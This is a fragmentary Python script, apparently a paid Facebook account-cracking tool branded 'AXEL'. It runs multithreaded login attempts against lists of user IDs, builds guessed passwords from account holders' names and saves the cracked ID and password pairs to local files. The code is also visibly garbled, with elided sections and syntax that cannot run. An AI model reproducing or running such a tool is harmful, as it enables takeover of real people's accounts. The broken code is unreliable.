...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO AXEL WORLD          ')
...
__________________________________________________
 ...
 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:AXEL\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            AXEL 420
\033[1;92m Facebook:            Imon Shah
\033[1;92m Github  :            imonshah143
\033[1;92m Version :            13.0.0
──────────────────────────────────────────────────""")
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/AXEL/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with AXEL(max_workers=30) as AXEL World:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                AXELworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                AXELworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                AXELworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                AXELworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                open('AXEL-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[AXEL]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('Axel1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    ...
    try:
        ...
        if Xyteee in system:
            ...
            tks = ("Hi Imon Shah Sir, I Need To Buy Your AXEL Tools Version 13.0.0 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
...
with Imon&Tutul(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)
